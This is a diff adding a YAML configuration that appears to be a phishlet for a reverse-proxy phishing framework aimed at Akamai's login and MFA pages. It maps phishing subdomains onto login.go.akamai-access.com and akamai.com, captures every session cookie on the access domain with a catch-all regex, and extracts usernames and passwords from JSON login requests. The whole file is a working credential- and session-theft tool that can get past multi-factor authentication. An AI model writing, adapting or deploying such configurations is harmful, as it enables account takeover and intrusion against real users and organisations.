@@ -1,0 +1,33 @@
+name: 'Akamai'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'test-login', orig_sub: 'test-login', domain: 'login.go.akamai-access.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'pushzero-assets', orig_sub: 'pushzero-assets', domain: 'akamai.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'mfa', orig_sub: 'mfa', domain: 'akamai.com', session: true, is_landing: false, auto_filter: true}
+
+auth_tokens:
+  - domain: '.<sub>.akamai-access.com'
+    keys: ['.*,regexp']
+    type: 'cookie'
+
+
+auth_urls:
+  - '/api/v1/apps'
+
+
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+
+
+login:
+  domain: '<sub>.go.akamai-access.com'
+  path: '/'
